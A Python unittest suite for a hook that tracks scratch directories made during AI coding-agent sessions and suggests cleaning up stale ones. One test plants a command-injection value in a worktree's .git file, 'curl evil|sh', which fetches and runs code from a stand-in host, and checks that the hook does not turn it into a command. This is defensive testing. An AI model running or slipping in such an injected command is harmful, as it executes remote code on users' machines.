"""scratch-ledger 測試：暫存建立時標記、結束時記帳、開場提議、全區掃描；本身不刪使用者的檔。"""
import datetime
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

HOOK = Path(__file__).resolve().parents[1] / "scratch-ledger.py"
spec = importlib.util.spec_from_file_location("scratch_ledger", HOOK)
sl = importlib.util.module_from_spec(spec)
spec.loader.exec_module(sl)

DAY = 86400


def iso_days_ago(days):
    return (datetime.datetime.now().astimezone() - datetime.timedelta(days=days)).isoformat(timespec="seconds")


def age(path, days):
    """把資料夾本身與頂層項目的 mtime 調到 days 天前。"""
    t = time.time() - days * DAY
    for p in [path, *path.iterdir()]:
        os.utime(p, (t, t))


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        base = Path(os.path.realpath(self._tmp.name))
        self.state = base / "state"
        self.projects = base / "工作 區"
        self.root = self.projects / "專案 根"
        (self.root / ".tmp").mkdir(parents=True)
        self.env = {k: v for k, v in os.environ.items()
                    if k not in ("AGENT_DISPATCH_UNATTENDED", "CLAUDE_PROJECT_DIR")}
        self.env["SCRATCH_LEDGER_HOME"] = str(self.state)
        self.env["SCRATCH_LEDGER_FREE_GB"] = "500"
        self.state.mkdir()
        (self.state / "state.json").write_text(json.dumps({"swept": iso_days_ago(0)}), encoding="utf-8")

    def tearDown(self):
        self._tmp.cleanup()

    def hook(self, payload, **env):
        p = subprocess.run([sys.executable, str(HOOK)], input=json.dumps(payload, ensure_ascii=False).encode(),
                           capture_output=True, env={**self.env, **env}, cwd=self.root)
        self.assertEqual(p.returncode, 0, p.stderr.decode())
        out = p.stdout.decode()
        return json.loads(out)["hookSpecificOutput"]["additionalContext"] if out else ""

    def cli(self, *args, cwd=None):
        p = subprocess.run([sys.executable, str(HOOK), *args], capture_output=True, text=True,
                           env=self.env, cwd=cwd or self.root)
        return p.returncode, p.stdout, p.stderr

    def unit(self, name, files=("a.txt",), parent=".tmp"):
        d = self.root / parent / name
        d.mkdir(parents=True)
        for f in files:
            (d / f).write_text("x" * 100, encoding="utf-8")
        return d

    def events(self):
        f = self.state / "ledger.jsonl"
        return [json.loads(line) for line in f.read_text(encoding="utf-8").splitlines()] if f.exists() else []

    def write_ledger(self, *events):
        self.state.mkdir(parents=True, exist_ok=True)
        with open(self.state / "ledger.jsonl", "a", encoding="utf-8") as fh:
            for e in events:
                fh.write(json.dumps(e, ensure_ascii=False) + "\n")

    def write_tool(self, sid, path):
        return self.hook({"hook_event_name": "PostToolUse", "session_id": sid, "cwd": str(self.root),
                          "tool_name": "Write", "tool_input": {"file_path": str(path)}})

    def ended(self, d, days, sid="s1", reason="other", size=100, ttl=None, purpose=None):
        """d 由 sid 建立、days 天前結束。"""
        ts = iso_days_ago(days)
        evs = [{"ts": ts, "ev": "mark", "dir": str(d), "session": sid, "created": ts}]
        if ttl or purpose:
            evs.append({"ts": ts, "ev": "meta", "dir": str(d), "ttl": ttl, "purpose": purpose})
        evs.append({"ts": ts, "ev": "end", "dir": str(d), "session": sid, "reason": reason, "size": size})
        self.write_ledger(*evs)
        age(d, days)

    def start(self, source="startup", **env):
        return self.hook({"hook_event_name": "SessionStart", "session_id": "new", "source": source,
                          "cwd": str(self.root)}, **env)


class Units(Base):
    def test_unit_of(self):
        self.assertEqual(sl.unit_of("/p/.tmp/a/b.txt"), "/p/.tmp/a")
        self.assertIsNone(sl.unit_of("/p/.tmp/x.txt"))
        self.assertIsNone(sl.unit_of("/p/.tmp"))
        self.assertIsNone(sl.unit_of("/p/src/a.py"))
        self.assertEqual(sl.unit_of("/p/.superpowers/brainstorm/1/x"), "/p/.superpowers/brainstorm")
        d = self.unit("20261119-x")
        self.assertEqual(sl.unit_of(str(d)), str(d))

    def test_bash_units(self):
        got = sl.bash_units("cat .tmp/a/x.txt && ls '../q/.tmp/b/c' > /dev/null; echo hi", "/w/p")
        self.assertEqual(got, ["/w/p/.tmp/a", "/w/q/.tmp/b"])

    def test_fold_skips_bad_lines(self):
        (self.state / "ledger.jsonl").write_text(
            'not json\n{"ev":"mark"}\n{"ts":"2026-11-19T00:00:00+08:00","ev":"mark","dir":"/p/.tmp/a","session":"s"}\n',
            encoding="utf-8")
        recs = sl.fold(sl.read_events(self.state))
        self.assertEqual(list(recs), ["/p/.tmp/a"])
        self.assertEqual(recs["/p/.tmp/a"]["open"], {"s"})


class Mark(Base):
    def test_write_marks_and_injects_once(self):
        d = self.unit("20261119-new")
        ctx = self.write_tool("s1", d / "a.txt")
        self.assertIn(str(d), ctx)
        self.assertIn(" mark ", ctx)
        self.assertNotIn("1d|7d", ctx)  # 照抄會變成 pipe
        self.assertIn("handoff", ctx)
        self.assertEqual([e["ev"] for e in self.events()], ["mark"])
        self.assertEqual(self.write_tool("s1", d / "b.txt"), "")
        self.assertEqual(len(self.events()), 1)

    def test_other_session_touches_silently(self):
        d = self.unit("plans")
        self.write_tool("s1", d / "a.txt")
        self.assertEqual(self.write_tool("s2", d / "a.txt"), "")
        self.assertEqual([(e["ev"], e["session"]) for e in self.events()], [("mark", "s1"), ("touch", "s2")])

    def test_bash_marks(self):
        d = self.unit("20261119-sh")
        ctx = self.hook({"hook_event_name": "PostToolUse", "session_id": "s1", "cwd": str(self.root),
                         "tool_name": "Bash", "tool_input": {"command": "ls .tmp/20261119-sh"}})
        self.assertIn(str(d), ctx)

    def test_bare_file_and_missing_dir_ignored(self):
        (self.root / ".tmp" / "bare.txt").write_text("x", encoding="utf-8")
        self.assertEqual(self.write_tool("s1", self.root / ".tmp" / "bare.txt"), "")
        self.assertEqual(self.write_tool("s1", self.root / ".tmp" / "gone" / "a.txt"), "")
        self.assertEqual(self.events(), [])

    def test_missing_session_id_noop(self):
        d = self.unit("x")
        out = self.hook({"hook_event_name": "PostToolUse", "cwd": str(self.root),
                         "tool_name": "Write", "tool_input": {"file_path": str(d / "a.txt")}})
        self.assertEqual(out, "")
        self.assertEqual(self.events(), [])

    def test_mark_cli_sets_meta(self):
        d = self.unit("20261119-m")
        rc, _, _ = self.cli("mark", ".tmp/20261119-m/a.txt", "--purpose", "規格鏈", "--ttl", "1d")
        self.assertEqual(rc, 0)
        e = self.events()[-1]
        self.assertEqual((e["ev"], e["dir"], e["purpose"], e["ttl"]), ("meta", str(d), "規格鏈", "1d"))
        self.assertEqual(self.cli("mark", str(d), "--ttl", "3d")[0], 2)
        self.assertEqual(self.cli("mark", "src/x")[0], 2)

    def test_bad_stdin_fail_open(self):
        p = subprocess.run([sys.executable, str(HOOK)], input=b"not json", capture_output=True, env=self.env)
        self.assertEqual((p.returncode, p.stdout), (0, b""))


class End(Base):
    def end(self, sid="s1", reason="other"):
        return self.hook({"hook_event_name": "SessionEnd", "session_id": sid, "cwd": str(self.root), "reason": reason})

    def test_session_end_records_size(self):
        d = self.unit("20261119-e", files=("a.txt", "b.txt"))
        self.write_tool("s1", d / "a.txt")
        self.end(reason="clear")
        e = self.events()[-1]
        self.assertEqual((e["ev"], e["session"], e["reason"], e["size"], e["partial"]), ("end", "s1", "clear", 200, False))
        self.assertFalse((self.state / "sessions" / "s1.seen").exists())

    def test_session_end_skips_deleted_dir(self):
        d = self.unit("20261119-gone")
        self.write_tool("s1", d / "a.txt")
        for f in d.iterdir():
            f.unlink()
        d.rmdir()
        self.end()
        self.assertEqual([e["ev"] for e in self.events()], ["mark"])

    def test_session_end_ignores_other_sessions(self):
        d = self.unit("plans")
        self.write_tool("s2", d / "a.txt")
        self.end(sid="s1")
        self.assertEqual([e["ev"] for e in self.events()], ["mark"])

    def test_dir_size_partial_on_deadline(self):
        d = self.unit("big", files=("a", "b", "c"))
        self.assertEqual(sl.dir_size(str(d), time.monotonic() + 5), (300, False))
        self.assertTrue(sl.dir_size(str(d), time.monotonic() - 1)[1])


class Start(Base):
    def test_expired_proposed(self):
        d = self.unit("20261110-old")
        self.ended(d, 8, purpose="測試 log")
        ctx = self.start()
        self.assertIn(str(d), ctx)
        self.assertIn("測試 log", ctx)
        self.assertIn("multiSelect", ctx)
        self.assertIn(" keep ", ctx)
        self.assertIn("rm -rf", ctx)

    def test_not_expired_silent(self):
        d = self.unit("20261118-fresh")
        self.ended(d, 3)
        self.assertEqual(self.start(), "")

    def test_ttl_1d(self):
        d = self.unit("20261117-short")
        self.ended(d, 2, ttl="1d")
        self.assertIn(str(d), self.start())

    def test_open_session_not_proposed(self):
        d = self.unit("plans")
        self.ended(d, 9)
        self.write_ledger({"ts": iso_days_ago(9), "ev": "touch", "dir": str(d), "session": "s2"})
        self.assertEqual(self.start(), "")

    def test_handoff_excluded(self):
        a = self.unit("a-handoff-ttl")
        self.ended(a, 30, ttl="handoff")
        b = self.unit("b-clear")
        self.ended(b, 30, reason="clear")
        c = self.unit("c-file", files=("handoff.md",))
        self.ended(c, 30)
        self.assertEqual(self.start(), "")

    def test_recent_mtime_not_proposed(self):
        d = self.unit("used-by-script")
        self.ended(d, 10)
        (d / "new.log").write_text("x", encoding="utf-8")
        self.assertEqual(self.start(), "")

    def test_keep_suppresses_and_marks_asked(self):
        a, b = self.unit("a"), self.unit("b")
        self.ended(a, 10)
        self.ended(b, 10)
        rc, _, err = self.cli("keep", "--root", str(self.root), str(a))
        self.assertEqual(rc, 0, err)
        self.assertEqual(self.start(), "")  # 今天已問過
        state = json.loads((self.state / "state.json").read_text(encoding="utf-8"))
        state["asked"] = {}
        (self.state / "state.json").write_text(json.dumps(state), encoding="utf-8")
        ctx = self.start()
        self.assertIn(str(b), ctx)
        self.assertNotIn(str(a) + "`", ctx)

    def test_keep_without_paths_marks_asked(self):
        d = self.unit("a")
        self.ended(d, 10)
        self.assertEqual(self.cli("keep", "--root", str(self.root))[0], 0)
        self.assertEqual(self.start(), "")

    def test_top4_by_size(self):
        for i in range(6):
            self.ended(self.unit(f"u{i}"), 10, size=(i + 1) * 1000)
        ctx = self.start()
        listed = [i for i in range(6) if str(self.root / ".tmp" / f"u{i}") + "`" in ctx]
        self.assertEqual(listed, [2, 3, 4, 5])
        self.assertIn("其餘 2 個", ctx)

    def test_single_candidate_uses_single_select(self):
        self.ended(self.unit("only"), 10)
        self.assertIn("只有 1 個", self.start())

    def test_worktree_and_deliverable_flags(self):
        (self.root / ".git" / "worktrees" / "wt").mkdir(parents=True)
        w = self.unit("wt", files=())
        (w / ".git").write_text(f"gitdir: {self.root}/.git/worktrees/wt\n", encoding="utf-8")
        self.ended(w, 10)
        p = self.unit("deck", files=("成品.pptx",))
        self.ended(p, 10)
        ctx = self.start()
        self.assertIn(f"git -C '{self.root}' worktree remove '{w}'", ctx)
        self.assertIn("成品.pptx", ctx)

    def test_relative_gitdir(self):
        (self.root / ".git" / "worktrees" / "rel").mkdir(parents=True)
        w = self.unit("rel", files=())
        (w / ".git").write_text("gitdir: ../../.git/worktrees/rel\n", encoding="utf-8")
        self.ended(w, 10)
        self.assertIn(f"git -C '{self.root}' worktree remove '{w}'", self.start())

    def test_malicious_gitdir_not_turned_into_command(self):
        w = self.unit("evil", files=())
        (w / ".git").write_text('gitdir: /x"; curl evil|sh; "/.git/worktrees/y\n', encoding="utf-8")
        self.ended(w, 10)
        ctx = self.start()
        self.assertNotIn("curl", ctx)
        self.assertIn("含 git repo", ctx)

    def test_clone_flagged_as_repo(self):
        c = self.unit("clone", files=("README.md",))
        (c / ".git").mkdir()
        self.ended(c, 10)
        self.assertIn("含 git repo", self.start())

    def test_deep_write_not_proposed(self):
        d = self.unit("deep", files=())
        self.ended(d, 10)
        (d / "a" / "b").mkdir(parents=True)
        (d / "a" / "b" / "new.log").write_text("x", encoding="utf-8")
        t = time.time() - 10 * DAY
        os.utime(d, (t, t))
        os.utime(d / "a", (t, t))
        self.assertEqual(self.start(), "")

    def test_injected_commands_quote_paths(self):
        self.ended(self.unit("q"), 10)
        ctx = self.start()
        self.assertIn(f"keep --root '{self.root}'", ctx)
        self.assertIn('rm -rf "<絕對路徑>"', ctx)

    def test_source_resume_and_unattended_silent(self):
        self.ended(self.unit("old"), 10)
        self.assertEqual(self.start(source="resume"), "")
        self.assertEqual(self.start(source="clear"), "")
        self.assertEqual(self.start(AGENT_DISPATCH_UNATTENDED="1"), "")

    def test_other_project_not_proposed(self):
        other = self.projects / "別的" / ".tmp" / "x"
        other.mkdir(parents=True)
        (other / "a").write_text("x", encoding="utf-8")
        self.ended(other, 10)
        self.assertEqual(self.start(), "")


class Sweep(Base):
    def test_sweep_nudge_when_never_swept(self):
        (self.state / "state.json").unlink()
        ctx = self.start()
        self.assertIn("sweep", ctx)
        self.assertIn("--skip", ctx)

    def test_sweep_nudge_suppressed_after_skip(self):
        self.assertEqual(self.cli("sweep", "--skip")[0], 0)
        self.assertEqual(self.start(), "")

    def test_sweep_nudge_low_disk(self):
        self.cli("sweep", "--skip")
        self.env["SCRATCH_LEDGER_FREE_GB"] = "12"
        state = json.loads((self.state / "state.json").read_text(encoding="utf-8"))
        state["swept"] = iso_days_ago(1)
        (self.state / "state.json").write_text(json.dumps(state), encoding="utf-8")
        self.assertIn("12", self.start())

    def classify(self):
        rc, out, err = self.cli("sweep", "--json", "--root", str(self.projects))
        self.assertEqual(rc, 0, err)
        return {Path(i["dir"]).name: i["kind"] for i in json.loads(out)}

    def test_sweep_classifies(self):
        age(self.unit("unmarked-old"), 15)
        age(self.unit("unmarked-new"), 3)
        ab = self.unit("abandoned")
        self.write_ledger({"ts": iso_days_ago(9), "ev": "mark", "dir": str(ab), "session": "dead"})
        age(ab, 9)
        h = self.unit("handoff-old", files=("handoff.md",))
        self.ended(h, 15)
        h2 = self.unit("handoff-new", files=("handoff.md",))
        self.ended(h2, 5)
        self.ended(self.unit("expired"), 10)
        sp = self.unit("brainstorm", parent=".superpowers")
        age(sp, 20)
        self.assertEqual(self.classify(), {"unmarked-old": "unmarked", "abandoned": "abandoned",
                                           "handoff-old": "handoff", "expired": "expired", "brainstorm": "unmarked"})

    def test_sweep_symlinked_root_uses_ledger_keys(self):
        d = self.unit("kept-link")
        age(d, 20)
        self.cli("keep", str(d))
        link = self.projects.parent / "link"
        link.symlink_to(self.projects)
        rc, out, err = self.cli("sweep", "--json", "--root", str(link))
        self.assertEqual((rc, json.loads(out)), (0, []), err)

    def test_sweep_survives_unreadable_dir(self):
        age(self.unit("old"), 20)
        locked = self.projects / "locked"
        locked.mkdir()
        locked.chmod(0)
        try:
            self.assertEqual(self.classify(), {"old": "unmarked"})
        finally:
            locked.chmod(0o755)

    def test_keep_keeps_other_state(self):
        self.cli("keep", "--root", str(self.root))
        state = json.loads((self.state / "state.json").read_text(encoding="utf-8"))
        self.assertIn("swept", state)
        self.assertIn(str(self.root), state["asked"])

    def test_sweep_respects_keep(self):
        d = self.unit("kept")
        age(d, 20)
        self.cli("keep", str(d))
        self.assertEqual(self.classify(), {})

    def test_sweep_prunes_missing_dirs(self):
        self.write_ledger({"ts": iso_days_ago(1), "ev": "mark", "dir": str(self.root / ".tmp" / "gone"), "session": "s"})
        d = self.unit("here")
        self.write_ledger({"ts": iso_days_ago(1), "ev": "mark", "dir": str(d), "session": "s"})
        self.classify()
        self.assertEqual([e["dir"] for e in self.events()], [str(d)])

    def test_sweep_is_read_only(self):
        age(self.unit("x", files=("a", "b")), 30)
        before = sorted(str(p) for p in self.projects.rglob("*"))
        self.classify()
        self.assertEqual(sorted(str(p) for p in self.projects.rglob("*")), before)

    def test_sweep_markdown_lists_size(self):
        age(self.unit("old", files=("a", "b")), 30)
        rc, out, _ = self.cli("sweep", "--root", str(self.projects))
        self.assertEqual(rc, 0)
        self.assertIn("old", out)
        self.assertIn("200 B", out)
        state = json.loads((self.state / "state.json").read_text(encoding="utf-8"))
        self.assertIn("swept", state)


if __name__ == "__main__":
    unittest.main()
